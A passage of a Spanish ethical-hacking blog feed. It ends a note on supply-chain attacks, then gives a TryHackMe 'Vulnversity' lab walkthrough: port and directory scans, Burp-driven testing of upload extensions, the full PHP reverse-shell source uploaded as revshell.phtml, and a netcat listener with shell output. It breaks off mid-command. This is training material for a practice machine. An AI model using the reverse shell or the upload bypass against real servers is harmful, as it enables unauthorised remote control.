class="headerlink" title="Ataques en la distribuición"></a>Ataques en la distribuición</h3><p>Los ataques en la distribución ocurren cuando los atacantes manipulan el hardware o el software antes de la instalación. Los atacantes manipulan el hardware o software en su origen o cuando está en tránsito. Los ejemplos de ataques de distribución incluyen puertas traseras creadas por proveedores de software o hardware en el momento de la fabricación. Los atacantes aprovechan estas puertas traseras para obtener acceso no autorizado a la información, los sistemas o la red objetivo.</p><ul><li><p>Modificación de software o hardware durante la producción.</p></li><li><p>Modificación de software o hardware durante la distribución.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Apuntes</category>
      
      <category>Introducción al Ethical Hacking</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Teoría</tag>
      
      <tag>Fundamental</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnversity</title>
    <link href="/2021/11/04/vulnversity/"/>
    <url>/2021/11/04/vulnversity/</url>
    
    <content type="html"><![CDATA[<h1 id="THM-Vunlversity-Walktrhough"><a href="#THM-Vunlversity-Walktrhough" class="headerlink" title="THM - Vunlversity Walktrhough"></a>THM - Vunlversity Walktrhough</h1><h2 id="Task-2-Reconocimiento"><a href="#Task-2-Reconocimiento" class="headerlink" title="Task 2 - Reconocimiento"></a>Task 2 - Reconocimiento</h2><h3 id="1-Escanear-todos-los-puertos-abiertos-y-las-versiones"><a href="#1-Escanear-todos-los-puertos-abiertos-y-las-versiones" class="headerlink" title="1. Escanear todos los puertos abiertos y las versiones:"></a>1. Escanear todos los puertos abiertos y las versiones:</h3><p>La primera tarea de todas para realizar un ataque es detectar los puertos y servicios expuestos. Esta tarea se suele realizar con el comando:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV -n -p- &lt;IP&gt;<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> &lt;IP&gt;<br>Host is up (0.051s latency).<br><br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         vsftpd 3.0.3<br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 5a:4f:<span class="hljs-built_in">fc</span>:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)<br>|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)<br>|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>3128/tcp open  http-proxy  Squid http proxy 3.5.12<br>|_http-server-header: squid/3.5.12<br>|_http-title: ERROR: The requested URL could not be retrieved<br>3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Vuln University<br>Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 2d16h27m17s, deviation: 2h18m34s, median: 2d15h07m17s<br>|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: vulnuniversity<br>|   NetBIOS computer name: VULNUNIVERSITY\x00<br>|   Domain name: \x00<br>|   FQDN: vulnuniversity<br>|_  System time: 2021-10-27T10:14:23-04:00<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   2.02: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2021-10-27T14:14:22<br>|_  start_date: N/A<br></code></pre></td></tr></table></figure><h3 id="2-Escanear-unicamente-los-puertos-abiertos-de-forma-rapida-Alternativa"><a href="#2-Escanear-unicamente-los-puertos-abiertos-de-forma-rapida-Alternativa" class="headerlink" title="2. Escanear únicamente los puertos abiertos de forma rápida: (Alternativa)"></a>2. Escanear únicamente los puertos abiertos de forma rápida: (Alternativa)</h3><p><strong>Script fast_scan.sh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span><br>        ip=<span class="hljs-variable">$1</span><br>        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> $(seq 1 65535); <span class="hljs-keyword">do</span><br>                timeout 1 bash -c <span class="hljs-string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span>&quot;</span> 2&gt;/dev/null &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$port</span> is OPEN[*]&quot;</span> &amp;<br>        <span class="hljs-keyword">done</span>; <span class="hljs-built_in">wait</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n[*] Use: ./fast_scan.sh &lt;IP&gt;\n&quot;</span><br>        <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fast_scan.sh &lt;IP&gt;<br></code></pre></td></tr></table></figure><p>Output</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Port 22 is OPEN[*]<br>Port 21 is OPEN[*]<br>Port 139 is OPEN[*]<br>Port 445 is OPEN[*]<br>Port 3128 is OPEN[*]<br>Port 3333 is OPEN[*]<br></code></pre></td></tr></table></figure><h3 id="3-Solucion"><a href="#3-Solucion" class="headerlink" title="3. Solución"></a>3. Solución</h3><p><img src="/img/Walkthrough/THM/Vulnversity/task_2.png" alt="Figura 1: Solución Task 2"></p><h2 id="Task-3-Localizar-directorios-con-Gobuster"><a href="#Task-3-Localizar-directorios-con-Gobuster" class="headerlink" title="Task 3 - Localizar directorios con Gobuster"></a>Task 3 - Localizar directorios con Gobuster</h2><h3 id="1-Buscar-directorios-accesibles-mediante-fuerza-bruta"><a href="#1-Buscar-directorios-accesibles-mediante-fuerza-bruta" class="headerlink" title="1. Buscar directorios accesibles mediante fuerza bruta"></a>1. Buscar directorios accesibles mediante fuerza bruta</h3><p>Para buscar los directorios disponibles de forma automatizada, recomiendo utilizar la herramienta <strong>Gobuster</strong>.<br>Las flags que he utilizado son:</p><table><thead><tr><th><strong>Flag</strong></th><th><strong>Función</strong></th></tr></thead><tbody><tr><td><strong>dir</strong></td><td>Busca directorios</td></tr><tr><td><strong>-u</strong></td><td>Especifica una url</td></tr><tr><td><strong>-w</strong></td><td>Especifica la ruta de la wordlist para bruteforcear directorios a probar</td></tr><tr><td><strong>-t</strong></td><td>Especifica número de threads a utilizar. (contra más threads, más rápido)</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dir -u http://&lt;IP&gt;:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://&lt;IP&gt;:3333<br>[+] Method:                  GET<br>[+] Threads:                 400<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2021/12/09 17:32:24 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>/images               (Status: 301) [Size: 320] [--&gt; http://&lt;IP&gt;:3333/images/]<br>/css                  (Status: 301) [Size: 317] [--&gt; http://&lt;IP&gt;:3333/css/]   <br>/js                   (Status: 301) [Size: 316] [--&gt; http://&lt;IP&gt;:3333/js/]    <br>/fonts                (Status: 301) [Size: 319] [--&gt; http://&lt;IP&gt;:3333/fonts/] <br>/internal             (Status: 301) [Size: 322] [--&gt; http://&lt;IP&gt;:3333/internal/]<br>===============================================================<br>&lt;Date&gt; Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h3 id="2-Solucion"><a href="#2-Solucion" class="headerlink" title="2. Solución"></a>2. Solución</h3><p><img src="/img/Walkthrough/THM/Vulnversity/task_3.png" alt="Figura 2: Solución Task 3"></p><h2 id="Task-4-Comprometer-el-Webserver"><a href="#Task-4-Comprometer-el-Webserver" class="headerlink" title="Task 4 - Comprometer el Webserver"></a>Task 4 - Comprometer el Webserver</h2><h3 id="1-Comprobar-el-tipo-de-ficheros-permitidos-para-el-Upload"><a href="#1-Comprobar-el-tipo-de-ficheros-permitidos-para-el-Upload" class="headerlink" title="1. Comprobar el tipo de ficheros permitidos para el Upload"></a>1. Comprobar el tipo de ficheros permitidos para el Upload</h3><p>Una vez accedemos al webserver <a href="http://ip:3333/internal">http://IP:3333/internal</a>, cargamos una web que permite al usuario subir ficheros al sistema.<br>Cuando el usuario busca conectarse al sistema via un Reverse Shell via web, lo más habitual es subir ficheros del tipo PHP o similares.</p><h4 id="1-Crear-la-lista-de-extensiones"><a href="#1-Crear-la-lista-de-extensiones" class="headerlink" title="1. Crear la lista de extensiones"></a>1. Crear la lista de extensiones</h4><p>Para comprobar de una forma eficaz que tipo de extensiones son válidas, se recomienda el uso de la herramienta <strong>Burpsuite</strong>.<br>He creado una fichero llamado “ext_check.txt”, el cuál contiene la lista de extensiones que quiero comprobar de forma automatizada.</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">cat ext_check.txt <br>php<br>php3<br>php4<br>php5<br>phtml<br></code></pre></td></tr></table></figure><h4 id="2-Interceptar-la-peticion-y-automatizar-la-comprobacion"><a href="#2-Interceptar-la-peticion-y-automatizar-la-comprobacion" class="headerlink" title="2. Interceptar la petición y automatizar la comprobación"></a>2. Interceptar la petición y automatizar la comprobación</h4><p>Una vez tengamos la lista creada, toca utilizar la herramienta <strong>Burpsuite</strong> y interceptar la petición que realiza el usuario cuando selecciona un fichero y le da al botón de <strong>Submit</strong>.</p><p>En el apartado de <strong>Intercept</strong>, nos deberá aparecer un código similar al de la siguiente imagen. El proximo paso es enviar esta petición al modo <strong>Intruder</strong> para poder seleccionar los campos de interes y poder iterar sobre ellos.<br><img src="/img/Walkthrough/THM/Vulnversity/burpsuite.png" alt="Figura 3: Modo Intercept"></p><p>En el apartado <strong>Positions</strong> debemos verificar que ejecutemos el ataque de tipo <strong>Sniper</strong> y marcar unicamente esos carácteres concretos con el botón lateral “Add §”.<br><img src="/img/Walkthrough/THM/Vulnversity/sniper.png" alt="Figura 4: Sniper Attack"></p><p>Finalmente, en el apartado <strong>Payloads</strong>, deberemos subir el fichero creado previamente con las extensiones.<br><img src="/img/Walkthrough/THM/Vulnversity/ext_list.png" alt="Figura 5: Cargar el fichero ext_check.txt"></p><p>Una vez realizado estos 3 pasos, podemos proceder a realizar el ataque. Esto nos devolverá un resultado similar a este:<br><img src="/img/Walkthrough/THM/Vulnversity/results.png" alt="Figura 6: Resultados del Sniper Attack"></p><p>De esta forma, vemos que la extension <strong>phtml</strong> tiene un lenght code diferente al resto. Esto significa que el resultado para esa extensión difiere de un resultado no valido “Lenght 737”.</p><h3 id="2-Subir-una-Reverse-Shell-y-establecer-comunicacion"><a href="#2-Subir-una-Reverse-Shell-y-establecer-comunicacion" class="headerlink" title="2. Subir una Reverse Shell y establecer comunicación"></a>2. Subir una Reverse Shell y establecer comunicación</h3><p>Una <strong>Reverse Shell</strong> es la forma más habitual la cuál los hackers acceden a un sistema de forma remota. Para ello, hay que buscar una forma de obligar al Host Remoto a establecer una conexión con el Host a la escucha (este equipo es el del atacante).</p><p>Para crear <strong>Reverse Shells</strong> de forma sencilla, existe <a href="https://www.revshells.com/">https://www.revshells.com</a>, que nos permite crear el código de dicha shell de forma automática únicamente especificando la IP del Host y el Puerto que va a estar escuchando en nuestro equipo.<br>Cuando se trata de ejecutar una <strong>Reverse Shell</strong> en lenguaje PHP, se suele utilizar <strong>PHP PentestMonkey</strong>.</p><h4 id="1-Crear-el-fichero-revshell-phtml"><a href="#1-Crear-el-fichero-revshell-phtml" class="headerlink" title="1. Crear el fichero revshell.phtml"></a>1. Crear el fichero revshell.phtml</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat revshell.phtml <br>&lt;?php<br>// php-reverse-shell - A Reverse Shell implementation <span class="hljs-keyword">in</span> PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php<br>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net<br><br>set_time_limit (0);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&lt;IP&gt;&#x27;</span>;<br><span class="hljs-variable">$port</span> = 1234;<br><span class="hljs-variable">$chunk_size</span> = 1400;<br><span class="hljs-variable">$write_a</span> = null;<br><span class="hljs-variable">$error_a</span> = null;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = 0;<br><span class="hljs-variable">$debug</span> = 0;<br><br><span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br><span class="hljs-variable">$pid</span> = pcntl_fork();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -1) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br><span class="hljs-built_in">exit</span>(0);  // Parent exits<br>&#125;<br><span class="hljs-keyword">if</span> (posix_setsid() == -1) &#123;<br>printit(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-variable">$daemon</span> = 1;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>printit(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-built_in">umask</span>(0);<br><br>// Open reverse connection<br><span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>printit(<span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (<span class="hljs-variable">$errno</span>)&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>   0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="hljs-built_in">read</span> from<br>   1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to<br>   2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[0], 0);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[1], 0);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[2], 0);<br>stream_set_blocking(<span class="hljs-variable">$sock</span>, 0);<br><br>printit(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (1) &#123;<br><span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br><span class="hljs-built_in">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[1])) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br><span class="hljs-built_in">break</span>;<br>&#125;<br><br><span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$pipes</span>[2]);<br><span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null);<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK: <span class="hljs-variable">$input</span>&quot;</span>);<br>fwrite(<span class="hljs-variable">$pipes</span>[0], <span class="hljs-variable">$input</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT: <span class="hljs-variable">$input</span>&quot;</span>);<br>fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR: <span class="hljs-variable">$input</span>&quot;</span>);<br>fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br>&#125;<br><br>fclose(<span class="hljs-variable">$sock</span>);<br>fclose(<span class="hljs-variable">$pipes</span>[0]);<br>fclose(<span class="hljs-variable">$pipes</span>[1]);<br>fclose(<span class="hljs-variable">$pipes</span>[2]);<br>proc_close(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$string</span>\n&quot;</span>;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="2-Buscar-directorio-donde-se-almacenan-los-Uploaded-Files"><a href="#2-Buscar-directorio-donde-se-almacenan-los-Uploaded-Files" class="headerlink" title="2. Buscar directorio donde se almacenan los Uploaded Files"></a>2. Buscar directorio donde se almacenan los Uploaded Files</h4><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dir -u http://&lt;IP&gt;:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://&lt;IP&gt;:3333/internal<br>[+] Method:                  GET<br>[+] Threads:                 400<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2021/12/09 17:45:48 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>/uploads             (Status: 301) [Size: 322] [--&gt; http://&lt;IP&gt;:3333/uploads/]<br>===============================================================<br>&lt;Date&gt; Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h4 id="3-Ejecutar-el-Listenner-en-nuestro-equipo"><a href="#3-Ejecutar-el-Listenner-en-nuestro-equipo" class="headerlink" title="3. Ejecutar el Listenner en nuestro equipo"></a>3. Ejecutar el Listenner en nuestro equipo</h4><p>Deberemos poner nuestro equipo a la escucha. De esa forma, cuando un usuario abra el fichero <strong>revshell.phtml</strong> esto establecerá la conexión y nos permitirá tener control del equipo desde la shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure><h4 id="4-Establecer-conexion"><a href="#4-Establecer-conexion" class="headerlink" title="4. Establecer conexión"></a>4. Establecer conexión</h4><p>Una vez accedemos a la ruta: <a href="http://ip:3333/internal/uploads/revshell.phtml">http://IP:3333/internal/uploads/revshell.phtml</a>, en nuestra ventana del terminal nos aparecerá que hemos establecido conexión con el equipo remoto y podemos navegar por todo el sistema.<br><img src="/img/Walkthrough/THM/Vulnversity/web_root.png" alt="Figura 7: http://&lt;IP&gt;:3333/internal/uploads/"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ nc -lvnp 1234                                                      127 ⨯<br>listening on [any] 1234 ...<br>connect to [&lt;L_HOST&gt;] from (UNKNOWN) [&lt;R_HOST&gt;] 49782<br>Linux vulnuniversity 4.4.0-142-generic <span class="hljs-comment">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 11:41:08 up 14 min,  0 users,  load average: 0.00, 0.13, 0.26<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure><p>Para saber que usuario gestiona el servidor web, deberemos ver que usuarios hay en la ruta <strong>/home</strong> y comprobar a cuales tenemos acceso.</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home      <br>$ ls<br>bill<br>$ <span 